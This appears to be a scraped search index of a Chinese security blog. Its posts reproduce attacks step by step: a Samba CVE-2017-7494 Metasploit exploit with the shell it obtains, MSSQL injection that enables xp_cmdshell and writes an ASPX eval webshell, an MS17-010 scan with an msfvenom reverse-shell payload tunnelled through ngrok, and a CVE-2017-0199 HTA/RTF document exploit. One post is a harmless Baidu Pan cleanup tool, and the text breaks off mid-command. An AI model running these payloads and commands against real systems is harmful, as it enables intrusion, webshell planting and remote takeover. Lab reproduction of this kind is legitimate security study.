总结主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。1.对于WebLogic弱口令，如何去上传WEBSHELL2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。 0x05 参考[1]https://github.com/phith0n/vulhub/tree/master/weblogic[2]http://blog.csdn.net/chs007chs/article/details/52514888","tags":"weblogic漏洞 ssrf weblogic反序列化"},{"title":"Samba远程代码执行漏洞(CVE-2017-7494)复现过程","url":"/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/","text":"概述Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。这里采用ubuntu-16.04.2 x64位为测试机。 复现过程环境的搭建靶机中默认未安装Samba，首先来安装Samba并进行配置。 1sudo apt install samba 安装成功，查看版本 修改Samba配置文件 1sudo gedit /etc/samba/smb.conf 在最底部添加如下内容 1234[fuping] #显示的共享文件夹名字path = /tmppublic = yeswriteable = yes 然后重启smbd服务 1sudo service smbd restart 至此，环境已经搭建成功。开始用Kail进行攻击。 攻击过程首先去下载利用的脚本。 12root@kali:~# cd /usr/share/metasploit-framework/modules/exploits/linux/sambaroot@kali:/usr/share/metasploit-framework/modules/exploits/linux/samba# wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb -O is_known_pipename.rb 然后就是在Metasploit中加载并使用脚本，攻击过程如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112msf &gt; use exploit/linux/samba/is_known_pipenamemsf exploit(is_known_pipename) &gt; show optionsModule options (exploit/linux/samba/is_known_pipename): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SMB_FOLDER no The directory to use within the writeable SMB share SMB_SHARE_BASE no The remote filesystem path correlating with the SMB share name SMB_SHARE_NAME no The name of the SMB share containing a writeable directoryExploit target: Id Name -- ---- 2 Linux x86msf exploit(is_known_pipename) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic 1 Linux ARM (LE) 2 Linux x86 3 Linux x86_64msf exploit(is_known_pipename) &gt; set RHOST 192.168.232.137RHOST =&gt; 192.168.232.137msf exploit(is_known_pipename) &gt; set target 3target =&gt; 3msf exploit(is_known_pipename) &gt; exploit[*] Started reverse TCP handler on 192.168.232.134:4444[*] 192.168.232.137:445 - Using location \\\\192.168.232.137\\fuping\\ for the path[*] 192.168.232.137:445 - Payload is stored in //192.168.232.137/fuping/ as gRoUnyzb.so[*] 192.168.232.137:445 - Trying location /volume1/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume1/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume2/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /volume3/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /shared/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/usb/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /media/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /mnt/media/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/FUPING/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /var/samba/Fuping/gRoUnyzb.so...[*] 192.168.232.137:445 - Trying location /tmp/gRoUnyzb.so...[*] Command shell session 1 opened (192.168.232.134:4444 -&gt; 192.168.232.137:41392) at 2017-05-24 12:35:20 -0400iduid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)whoaminobodyifconfigdocker0 Link encap:Ethernet HWaddr 02:42:23:77:72:91 inet addr:172.17.0.1 Bcast:0.0.0.0 Mask:255.255.0.0 inet6 addr: fe80::42:23ff:fe77:7291/64 Scope:Link UP BROADCAST MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:2 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 B) TX bytes:180 (180.0 B)ens33 Link encap:Ethernet HWaddr 00:0c:29:77:23:9e inet addr:192.168.232.137 Bcast:192.168.232.255 Mask:255.255.255.0 inet6 addr: fe80::7651:9ad0:80e5:c9c8/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:349052 errors:0 dropped:0 overruns:0 frame:0 TX packets:112974 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:419009840 (419.0 MB) TX bytes:8902292 (8.9 MB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:23329 errors:0 dropped:0 overruns:0 frame:0 TX packets:23329 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:48010585 (48.0 MB) TX bytes:48010585 (48.0 MB) 需要填写目标地址和选择Target，我的是x64位系统，所以设置了target为3。 效果图 更新2017.05.26 对需要登陆的Smb进行验证脚本已经更新，集成在msf中，直接msfupdate即可。 1.修改Ubuntu中的Samba配置文件。 1sudo gedit /etc/samba/smb.conf 在[global]中添加：security = user修改底部的[fuping] 123[fuping] #显示的共享文件夹名字path = /tmpwriteable = yes 2.添加smb用户 12sudo useradd smbusersudo smbpasswd -a smbuser 3.开始攻击12345678msf &gt; use exploit/linux/samba/is_known_pipename msf exploit(is_known_pipename) &gt; set SMBUSER smbuserSMBUSER =&gt; smbusermsf exploit(is_known_pipename) &gt; set SMBPASS smbuserSMBPASS =&gt; smbusermsf exploit(is_known_pipename) &gt; set RHOST 192.168.232.137RHOST =&gt; 192.168.232.137msf exploit(is_known_pipename) &gt; exploit 解决方案1.受影响的用户尽快下载最新的Samba版本手动更新。2.使用二进制分发包（RPM等方式）的用户立即进行yum，apt-get update等安全更新操作3.不打补丁的缓解策略：用户可以通过在smb.conf的[global]节点下增加“nt pipe support = no”选项，然后重新启动samba服务， 以此达到缓解该漏洞的效果。 参考[1]https://github.com/rapid7/metasploit-framework/pull/8450[2]http://bobao.360.cn/learning/detail/3900.html[3]https://securityonline.info/cve-2017-7494-samba-remote-code-execution-vulnerability/","tags":"cve-2017-7494 samba漏洞"},{"title":"如何清除百度网盘重复文件","url":"/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/","text":"0x00 前言百度网盘最近推出了一个垃圾文件清理功能，可以扫描重复的文件，就试了一下。扫描结果发现存在许多的重复文件，删除后空间可以再多一个T。就想删除一下，结果需要开通会员。于是就想着来实现一下如何快速删除网盘重复的文件。要实现这个功能，第一首先要知道重复的文件，第二就是对这些重复的文件进行删除了。 0x01 如何获取重复的文件这里以wap版为例。打开https://pan.baidu.com/wap/home 并抓包。可以看到一个Get请求 1https://pan.baidu.com/api/list?bdstoken=***********&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTYxMjU1OTQ1NDAuOTE2MjI3ODg0NjE5MTU0Ng==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=1&amp;num=20&amp;dir=%2F 主要请求参数： 参数名 备注 bdstoken 网页源代码中有 loginid BASE64(时间戳+四位+.+16位数字)，固定值即可 page 页码 num 每页显示条数 dir 文件路径 order 排序的条件（固定时间排序即可） desc 升序降序（降序排列即可） 其他参数固定值即可返回内容为JSON 当遇到文件时，会返回文件的MD5和大小以及路径。 返回JSON中的主要内容说明只列举需要的字段 名称 含义 备注 isdir 是否为目录 文件为0，目录为1 size 文件大小 单位是字节 md5 文件的MD5值 可以用来判断文件是否重复 path 文件的路径 包含文件名 server_filename 文件名称 文件的名称 于是可以根据文件的MD5值来判断文件是否重复。首先将文件的主要信息（如MD5、大小、路径、名字）等信息保存到数据库中。然后根据MD5来判断是否重复，将重复的文件列出来，最后就是删除了。这里采用的开发语言是Java，Http请求采用了jsoup，处理Json采用了FastJson。数据库采用了MySQL。因为主要是为了分享思路，所以只贴部分代码了，知道怎么实现这个流程，代码写起来就简单许多了，实现的语言也就多样化了。具体实现步骤如下： 1.获取bdstoken访问https://pan.baidu.com/wap/home ，查看源代码搜索bdstoken即可看到。代码的实现如下：123456789101112131415/** * 获取bdstoken * @return bdstoken */public static String getbdstoken()&#123; String bdstoken = null; Document doc = getDoc(Util.URL_HOME,getCookies()); String regex = \"\\\"bdstoken\\\":\\\"(.*)\\\",\\\"quota\"; Pattern pattern = Pattern.compile(regex); Matcher matcher = pattern.matcher(doc.html()); if(matcher.find())&#123; bdstoken = matcher.group(1); &#125; return bdstoken;&#125; Cookie只需要两个内容，一个是BDUSS，另一个是STOKEN。 1234567public static Map&lt;String,String&gt; getCookies()&#123; Map&lt;String,String&gt; cookies = new HashMap&lt;String, String&gt;(); cookies.put(\"BDUSS\", \"你的BDUSS\"); cookies.put(\"STOKEN\", \"你的STOKEN\"); return cookies;&#125; 2.递归获取所有的文件，并将文件的相关内容保存到数据库中获取每页文件内容时需要三个参数：当前页面、每页显示数量和路径。如下代码所示：123456789101112131415/** * 列出当前页面文件 * @param page 页面 * @param num 显示数量 * @param dir 路径 * @return */public static List&lt;PanFile&gt; getFiles(int page,int num,String dir)&#123; String url = \"https://pan.baidu.com/api/list?bdstoken=\"+getbdstoken()+\"&amp;web=5&amp;app_id=250528&amp;logid=MTQ5NTQxMzA2Njg4ODAuODE0NzYwMjEyMzAzOTY5Mg==&amp;channel=chunlei&amp;clienttype=5&amp;order=time&amp;desc=1&amp;showempty=0&amp;page=\"+page+\"&amp;num=\"+num+\"&amp;dir=\"+dir; String jsonStr = getbody(url, getCookies()); JSONObject jsonObj = JSONObject.parseObject(jsonStr); JSONArray result = jsonObj.getJSONArray(\"list\"); List&lt;PanFile&gt; files= JSON.parseArray(result.toJSONString(),PanFile.class); return files;&#125; 递归遍历当前路径下所有文件代码如下：123456789101112131415161718192021222324252627282930313233/** * 递归打印当前路径下所有文件，并入库 * @param str 路径 */public static void printFiles(String str)&#123; boolean flag=false; String dency[] = &#123;\"/C#资料/我的c#\",\"/12-19 Java Workplace\",\"/dumppp\",\"/myWEB\"&#125;;//白名单，针对其中的目录不遍历 for (String string : dency) &#123; if(str.trim().equals(string))&#123; flag = true; &#125; &#125; if(!flag)&#123; try &#123; str = URLEncoder.encode(str, \"utf-8\"); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; List&lt;PanFile&gt; files= UtilMethod.getFiles(1,2000,str); for (PanFile panFile : files) &#123; if(panFile.getIsdir()==1)&#123; printFiles(panFile.getPath()); &#125;else&#123; String fileName = panFile.getPath(); System.out.println(fileName+\"---size:\"+panFile.getSize()+\"--md5:\"+panFile.getMd5()); insertDB(panFile.getServerMtime(),panFile.getCategory(),panFile.getFsId(),panFile.getIsdir(), panFile.getServerCtime(),panFile.getLocalMtime(),panFile.getSize(),panFile.getMd5(), panFile.getPath(),panFile.getLocalCtime(),panFile.getServerFilename()); &#125; &#125; &#125;&#125; 效果如图所示 查看数据库中的文件信息 由于有些目录下面是代码，而且文件多有小，所以就不针对这些文件目录下的文件进行遍历。就采用了白名单的方式，对白名单中内容不遍历。由于某些路径中含有其他字符，导致找不到路径，使用采用了URL编码。为了方便，直接将page设置为1，num值换为2000（可以根据自己的文件多少来调节，最好大一些），一页就将所有的数据显示出来。插入数据库方法的代码比较简单，这里就省略了。 3.获取重复的大文件已经将文件的信息都存储在数据库中，然后根据数据库中文件的MD5来获取重复的文件。我这里只把大于500M的重复文件给列举出来。 1.获取大于500M的重复文件的MD5123456789101112131415161718192021222324252627282930/** * 获取大于500M的重复文件的MD5 * @return */public static List&lt;String&gt; setp1()&#123; List&lt;String&gt; ltMd5 = new ArrayList&lt;String&gt;(); String sql = \"select count(*),md5,server_filename from mmpan \" + \"where size &gt; 1024*1024*500 \" + \"group by md5 \" + \"HAVING COUNT(md5) &gt;1 \" + \"order by path\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); rst = pst.executeQuery(); while(rst.next())&#123; ltMd5.add(rst.getString(\"md5\")); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return ltMd5; &#125; 2.根据步骤1获取文件的MD5值，获取最小path的长度1234567891011121314151617181920212223242526/** * 根据文件的MD5值，获取最小path的长度 * @param md5 * @return */public static int setp2(String md5)&#123; int length = -1; String sql = \"select min(LENGTH(path)) from mmpan where md5=?\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); pst.setString(1, md5); rst = pst.executeQuery(); if(rst.next())&#123; length = rst.getInt(1); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return length;&#125; 3.根据MD5和最短路径，列出大于最短路径的文件12345678910111213141516171819202122232425262728/** * 根据MD5和最短路径，列出大于最短路径的文件 * @param md5 * @param length * @return */public static List&lt;String&gt; setp3(String md5,int length)&#123; List&lt;String&gt; ltPath = new ArrayList&lt;String&gt;(); String sql = \"select path from mmpan where md5=? and LENGTH(path) &gt; ?\"; Connection conn = DBFactory.getConnection(); PreparedStatement pst = null; ResultSet rst = null; try &#123; pst = conn.prepareStatement(sql); pst.setString(1, md5); pst.setInt(2, length); rst = pst.executeQuery(); while(rst.next())&#123; ltPath.add(rst.getString(1)); &#125; &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally &#123; DBFactory.close(rst, pst, conn); &#125; return ltPath;&#125; 获取这个列表是为了将其删除 将以上三步综合起来，如下123456789101112131415161718/** * 获取指定条件下文件路径 * @return */public static List&lt;String&gt; getPaths()&#123; List&lt;String&gt; ltPath = null; List&lt;String&gt; ltPaths = new ArrayList&lt;String&gt;(); List&lt;String&gt; lt = UtilMethod.setp1(); int length = -1 ; for (String md5 : lt) &#123; length = UtilMethod.setp2(md5); ltPath = UtilMethod.setp3(md5, length); for (String path : ltPath) &#123; ltPaths.add(path); &#125; &#125; return ltPaths;&#125; 此时列表中的文件都是为了删除的文件的路径。 0x02 如何实现删除文件删除文件时抓包，发现如下请求12345678POST /api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=****&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0 HTTP/1.1Host: pan.baidu.comX-Requested-With: XMLHttpRequestCookie: CookieConnection: closeContent-Length: 61filelist=%5B%22%2F000%2F%E7%A4%BE%E5%B7%A5%E5%BA%93.rar%22%5D 所需参数有bdstoken和删除文件的列表 我们首先将需要删除文件拼接起来 12345678910111213141516171819/** * 根据文件路径拼接filelist * @return */public static String getFileList()&#123; List&lt;String&gt; ltPath = UtilMethod.getPaths(); StringBuilder sb = new StringBuilder(); sb.append(\"[\"); for (int i = 0; i &lt; 3; i++) &#123; //System.out.println(ltPath.get(i)); sb.append(\"\\\"\"); sb.append(ltPath.get(i)); sb.append(\"\\\"\"); sb.append(\",\"); &#125; sb.append(\"***]\"); return sb.toString().replace(\",***\", \"\");&#125; 为了测试，我仅仅先删除三条进行测试。如果需要全部删除，将3换成ltPath.size()即可。 删除文件的代码如下：123456789101112131415/** * 根据文件列表删除文件 * @param filelist * @return */public static String delRequest(String filelist)&#123; String url = \"https://pan.baidu.com/api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=\"+getbdstoken()+\"&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0\"; String result = \"删除失败,请重试\"; String jsonStr = getbody(url, getCookies(),filelist); JSONObject jsonObj = JSONObject.parseObject(jsonStr); if(jsonObj.get(\"errno\").toString().equals(\"0\"))&#123; result = \"文件删除成功，删除成功的文件为\"+filelist; &#125; return result;&#125; 测试删除的代码如下：123456@Testpublic void testdelFile()&#123; String fileList = UtilMethod.getFileList(); System.out.println(UtilMethod.delRequest(fileList));&#125; 附上效果图 大功告成。不过删除的时候要注意一下，删除错误的话可以去回收站查看，然后再恢复。不要急于清除回收站。代码仅供参考。代码地址：代码Python的实现脚本https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py 。python代码删除文件效果图 还有一种最快的实现方法就是开个会员o(╯□╰)o。 0x03 总结本文没有什么大的知识点，都是常用的内容拼接在了一起。主要用到了三方面的内容：1.如何模拟网络请求抓取数据。这里采用了Java代码，Http请求采用了Jsoup。2.JSON解析，使用了FastJSON来实现3.递归遍历的实现 Python的实现也就是请求Http和数据库的操作。使用Python时要多注意数据类型和编码的转换。","tags":"百度网盘 快速清除 java代码 python脚本"},{"title":"MSSQL DBA权限获取WEBSHELL的过程","url":"/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/","text":"前言本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。 过程首先找到一个如下的注入点： 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1' and 1=user;-- 通过SQLMAP可以查看到是DBA权限 创建临时表1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';CREATE TABLE tt_tmp (tmp1 varchar(8000));-- 在WINDOWS下查找文件用如下命令： 1for /r 目录名:\\ %i in (匹配模式) do @echo %i 例如在C盘下搜索NewsList.aspx，可以使用for /r c:\\ %i in (Newslist*.aspx) do @echo %i或者for /r c:\\ %i in (Newslist.aspx*) do @echo %i 使用for /r c:\\ %i in (Newslist*.aspx) do @echo %i的搜索结果 一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。使用for /r c:\\ %i in (Newslist.aspx) do @echo %i的搜索结果 用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';insert into tt_tmp(tmp1) exec master..xp_cmdshell 'for /r c:\\ %i in (Newslist*.aspx) do @echo %i ';-- 如果无法执行xp_cmdshell，并提示如下错误SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。 可以使用如下命令来启用xp_cmdshell 1234;EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE;-- 然后再次执行搜索命令。 在执行上述搜索和插入过程后，可以使用&#39; and (select(*) from tt_tmp)&gt;1页面返回是否正常来判断是否有搜索结果。当没有找到的话，select(*) from tt_tmp的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\\ %i in (Newslist*.aspx) do @echo %i &#39;;--。也可以使用sqlmap来查看条数。 可以用报错将表内容给显示出来1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2' and 1=(select top 1 tmp1 from tt_tmp)and 'a'='a 继续爆1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('c:\\inetpub\\wwwroot\\manage\\news\\NewsList.aspx '))and 'a'='a 也可以用sqlmap直接将表中数据读取出来 然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。 这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';exec master..xp_cmdshell 'echo test &gt;c:\\\\WWW\\\\2333.txt';-- 然后访问http://192.168.232.138:81/2333.txt 成功访问，然后就是写一句话 1http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1';exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=\"Jscript\"%^&gt;^&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%^&gt; &gt; c:\\\\WWW\\\\233.aspx' ;-- 成功写入。然后就是进一步的操作了，这里就不概述了。 DOS命令将文件写入文本中时，遇到&lt;&gt;应在前面加上^。 总结这里一共有三个小的知识点:1.sa用户如何开启xp_cmdshell1234EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE; 2.Windows下利用dos如何搜索文件12for /r c:\\ %i in (Newslist*.aspx) do @echo %ifor /r c:\\ %i in (Newslist.aspx*) do @echo %i 3.dos命令下写文件遇到&lt;&gt;如何处理 1echo ^&lt;^&gt; &gt; 123.txt 参考[1]Windows命令行(cmd)下快速查找文件(类似Linux下find命令) [2]技术分享：MSSQL注入xp_cmdshell","tags":"mssql webshell aspx"},{"title":"MS17-010漏洞检测与内网穿透技术的应用","url":"/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/","text":"0x00 前言本文主要介绍一下MSF模块的下载、使用，以及当攻击机处于内网，而目标机也处于内网的解决方法。这里借助MS17-010漏洞来具体讲解一下，并没有新的知识点，可以为刚入门的新手抛砖引玉，提供一条解决问题的思路，同时也记录一下过程，加强记忆。主要分为两个知识点，一是SMB漏洞的批量检测，二是内网穿透技术。首先是环境的搭建，具体如下表所示： 主机 IP 备注 Kali 64位 192.168.232.134 攻击机 Windows XP 32位 192.168.232.128 安装了python2.6，下载有方程式利用工具包（主要为Windows目录下的工具） Window2008 R2 64位 10.50.2.62 靶机，存在MS17-010漏洞，并可以访问外网 0x01 SMB漏洞批量检测1.扫描脚本的下载和加载由于Metasploit还没有更新MS17-010检测的模块，所以要去exploit-db下载，并在MSF中加载。12root@kali:~# cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smbroot@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb# wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb 启动Metasploit，模块会自动加载，或者使用命令reload_all重新加载所有模块。 2.漏洞扫描的使用方法选择使用smb_ms_17_010模块，并查看使用命令。12msf &gt; use auxiliary/scanner/smb/smb_ms_17_010msf auxiliary(smb_ms_17_010) &gt; show options 所必须的参数有三个，对于无需登录的SMB，我们只需设置一下扫描的IP段、线程并运行即可开始扫描。12345msf auxiliary(smb_ms_17_010) &gt; set RHOSTS 10.50.2.1-255RHOSTS =&gt; 10.50.2.1-255msf auxiliary(smb_ms_17_010) &gt; set THREADS 10THREADS =&gt; 10msf auxiliary(smb_ms_17_010) &gt; run 出现黄色警告的表示可能存在，需要进一步验证。为了方便将存在漏洞的IP列出来，写了一个简单的Python脚本。1234567891011import reif __name__ == '__main__': f = open(\"smb.txt\", mode='r', buffering=1) while(True): line = f.readline() if line : if \"likely\" in line: print line.split(' ')[1].split(':')[0] else: break 提取出的IP如下所示： 12345678910111213.....10.50.2.5210.50.2.6210.50.2.6510.50.2.6110.50.2.6310.50.2.6410.50.2.7610.50.2.6910.50.2.7710.50.2.7810.50.2.79.... 有了存在漏洞的地址，接下来将开始对其进行验证，以10.50.2.62为例。由于Kali在虚拟机，宿主机IP为2.0..，目标机在10.50.2.*。相当于需要从内网到另一个内网， 选择采用了ngrok进行tcp的端口转发来实现内网的穿透。 0x02 内网穿透这里采用了www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。注册并开通隧道，如图所示。 下载对应的客户端，下载地址为：https://www.ngrok.cc/#down-client ，选择与系统对应的软件。我这里Kali为64位的，下载和使用命令如下： 12345root@kali:~/Downloads# wget hls.ctopus.com/sunny/linux_amd64.ziproot@kali:~/Downloads# unzip linux_amd64.ziproot@kali:~/Downloads# cd linux_amd64/root@kali:~/Downloads/linux_amd64# lsroot@kali:~/Downloads/linux_amd64# ./sunny clientid 隧道ID 出现下图的界面表示运行成功。 使用如下命令生成用于监听的dll文件。监听的IP为server.ngrok.cc的地址，端口为开通隧道时填写的远程端口。1root@kali:~/Documents# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56 LPORT=6266 -f dll &gt; got.dll 然后在Kali上设置监听本机的IP和端口，也就是在开通隧道时填写的本地端口。12345use exploit/multi/handlerset LHOST 192.168.232.134set LPORT 5555set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 由于关于Eternalblue利用方法有很多教程了，这里就不详细说明了，如图所示。攻击成功时查看ngrok客户端发现有一个连接。而且Kali上也生成了一个meterpreter会话。之后的操作就很简单了，可以添加用户等等。最后远程登录成功如下图所示。使用natapp也是可以的。 0x03 总结本文主要以MS17-010为例，讲解了如何下载和利用Metasploit中没有的模块，以及如何解决内网到内网的穿透的问题，当然解决的方法还有很多，这里就不再介绍了。 没有什么新的知识，怕忘记所以记录一下~~ 0x04 参考[1]https://www.exploit-db.com/exploits/41891/[2]http://bobao.360.cn/learning/detail/3041.html","tags":"ms17-010 metasploit ngrok"},{"title":"CVE-2017-0199漏洞复现过程","url":"/2017/04/18/CVE-2017-0199漏洞复现过程/","text":"记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。结尾附上利用MSF生成exploit（外国黑客城会玩）。 准备工作一台apache服务器（这里我用Kali）、POC和一个Word文档。POC内容大概如下：1234&lt;script&gt;a=new ActiveXObject(\"WScript.Shell\");a.run('%windir%\\\\System32\\\\cmd.exe /c calc.exe', 0);window.close();&lt;/script&gt; Word文档内容任意。 然后将其放在Kali服务器上Apache需要开启DAV支持，具体命令如下1234a2enmod dav a2enmod dav_fs a2enmod dav_lock a2enmod headers 测试过程在web目录新建ms文件夹，将test.docx复制到ms目录下，并重命名为test.rtf12root@kali:~/Documents# cp test.docx /var/www/html/ms/test.rtf 新建Word文档，插入对象如图 并保存为rtf文件，如233.rtf删除服务器上的test.rtf文件并将poc.hta文件复制到ms目录下，并改名为test.rtf12root@kali:/var/www/html/ms# rm -rf test.rtf root@kali:~/Documents# cp poc.hta /var/www/html/ms/test.rtf 修改Apache配置 1234567&lt;Directory /&gt; Dav on &lt;/Directory&gt; &lt;Directory /var/www/html/ms/&gt; Header set Content-Type \"application/hta\" &lt;/Directory&gt; 并重启服务器service apache2 restart 打开233.rtf文档 双击word文档的文字，将会有惊喜弹出 打开文档就弹出的话需要将\\object\\objautlink\\rsltpict修改为\\object\\objautlink\\objupdate\\rsltpict 再次打开文件 彩蛋（MSF下的实现）在kali下执行。首先更新msf到最新。（假设你们都完成了这个过程） 下载利用脚本1root@kali:/usr/share/metasploit-framework/modules/exploits/windows/fileformat# wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb 然后msf下执行命令reload_all重新加载模块 下载rtf文件到/usr/share/metasploit-framework/data/exploits目录 123cd /usr/share/metasploit-framework/data/exploitswget 